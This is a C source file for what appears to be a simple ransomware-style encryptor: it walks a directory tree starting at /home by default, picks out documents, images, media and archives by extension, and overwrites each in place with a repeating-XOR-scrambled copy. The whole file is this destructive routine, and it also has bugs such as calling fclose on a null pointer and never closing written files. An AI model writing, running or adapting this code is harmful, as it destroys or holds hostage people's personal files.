#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ftw.h>
#include <sys/stat.h>
#include <string.h>

struct filez {
	uint8_t *buffer;
	uint64_t size;
};
typedef struct filez Filez;

//Function prototypes
int readfile(const uint8_t *);
void writefile(const uint8_t *, uint8_t *, uint64_t);
void encryptDecrypt(uint8_t *, uint64_t);
int list(const char *name, const struct stat *status, int type);
void encryptFile(const char *);
int check(const char *);

Filez file;

int main(int argc, uint8_t *argv[]) {
	const char *path;
	// get starting path
	if (argc == 1) {
		path = "/home";
	} else if (argc == 2) {
		path = argv[1];
	} else {
		printf("Usage: %s <starting path>\n", argv[0]);
	}

	// start encryption
	ftw(path, list, 1);

	return 0;
}

void encryptFile(const char* array) {
	// read file into buffer
	if (readfile(array) == 1) {
		printf("Failed to read %s\n", array);
		return;
	}
	printf("Read %s\n", array);
	
	// encrypt file
	encryptDecrypt(file.buffer, file.size);
	printf("Encryption successful\n");

	// write out to disk
	writefile(array, file.buffer, file.size);

	free(file.buffer);
}

int list(const char *name, const struct stat *status, int type) {
	if(type == FTW_NS)
		return 0;

	if(type == FTW_F) {
		// ignore hidden files
		if (strstr(name, "/.") == NULL) {
			if (check(name) == 0) {
				encryptFile(name);
			}
		}
	}

	return 0;
}

int check(const char *name) {
	if (strcasestr(name, ".doc") != NULL) return 0;
	if (strcasestr(name, ".odt") != NULL) return 0;
	if (strcasestr(name, ".rtf") != NULL) return 0;
	if (strcasestr(name, ".md") != NULL) return 0;
	if (strcasestr(name, ".wpd") != NULL) return 0;
	if (strcasestr(name, ".ppt") != NULL) return 0;
	if (strcasestr(name, ".pps") != NULL) return 0;
	if (strcasestr(name, ".odp") != NULL) return 0;
	if (strcasestr(name, ".key") != NULL) return 0;
	if (strcasestr(name, ".ods") != NULL) return 0;
	if (strcasestr(name, ".xlr") != NULL) return 0;
	if (strcasestr(name, ".xls") != NULL) return 0;
	if (strcasestr(name, ".txt") != NULL) return 0;
	if (strcasestr(name, ".pdf") != NULL) return 0;
	if (strcasestr(name, ".zip") != NULL) return 0;
	if (strcasestr(name, ".jpeg") != NULL) return 0;
	if (strcasestr(name, ".jpg") != NULL) return 0;
	if (strcasestr(name, ".png") != NULL) return 0;
	if (strcasestr(name, ".gif") != NULL) return 0;
	if (strcasestr(name, ".bmp") != NULL) return 0;
	if (strcasestr(name, ".psd") != NULL) return 0;
	if (strcasestr(name, ".ico") != NULL) return 0;
	if (strcasestr(name, ".svg") != NULL) return 0;
	if (strcasestr(name, ".tif") != NULL) return 0;
	if (strcasestr(name, ".mp3") != NULL) return 0;
	if (strcasestr(name, ".flac") != NULL) return 0;
	if (strcasestr(name, ".aif") != NULL) return 0;
	if (strcasestr(name, ".wav") != NULL) return 0;
	if (strcasestr(name, ".wma") != NULL) return 0;
	if (strcasestr(name, ".ogg") != NULL) return 0;
	if (strcasestr(name, ".mpa") != NULL) return 0;
	if (strcasestr(name, ".cda") != NULL) return 0;
	if (strcasestr(name, ".mp4") != NULL) return 0;
	if (strcasestr(name, ".wmv") != NULL) return 0;
	if (strcasestr(name, ".mpg") != NULL) return 0;
	if (strcasestr(name, ".mpeg") != NULL) return 0;
	if (strcasestr(name, ".m4v") != NULL) return 0;
	if (strcasestr(name, ".h264") != NULL) return 0;
	if (strcasestr(name, ".mkv") != NULL) return 0;
	if (strcasestr(name, ".3g2") != NULL) return 0;
	if (strcasestr(name, ".3gp") != NULL) return 0;
	if (strcasestr(name, ".avi") != NULL) return 0;
	if (strcasestr(name, ".mov") != NULL) return 0;
	if (strcasestr(name, ".flv") != NULL) return 0;
	if (strcasestr(name, ".7z") != NULL) return 0;
	if (strcasestr(name, ".tar") != NULL) return 0;
	if (strcasestr(name, ".rar") != NULL) return 0;
	if (strcasestr(name, ".gz") != NULL) return 0;
	return 1;
}

void encryptDecrypt(uint8_t *input, uint64_t size) {
	uint8_t key[] = {'A', 'B', 'C'}; //Can be any chars, and any size array
	
	for(int i = 0; i < size; i++) {
		input[i] = input[i] ^ key[i % (sizeof(key)/sizeof(uint8_t))];
	}
}

void writefile(const uint8_t *name, uint8_t *content, uint64_t size) {
	FILE *fp = fopen(name, "wb");
	if (fp == NULL) {
		printf("Failed to write %s\n", name);
		return;
	}
	fwrite(content, 1, size, fp);
	printf("Write successful\n");
}

int readfile(const uint8_t *name) {
	// get file pointer
	FILE *fp = fopen(name, "rb");
	if (fp == NULL) {
		fclose(fp);
		return 1;
	}

	// get file size
	fseek(fp, 0, SEEK_END);
	file.size = ftell(fp);
	rewind(fp);

	// initalize buffer with file size
	file.buffer = (uint8_t *)malloc((file.size+1)*sizeof(uint8_t));

	// read all characters into buffer
	fread(file.buffer, 1, file.size, fp);

	// close file
	fclose(fp);

	return 0;
}
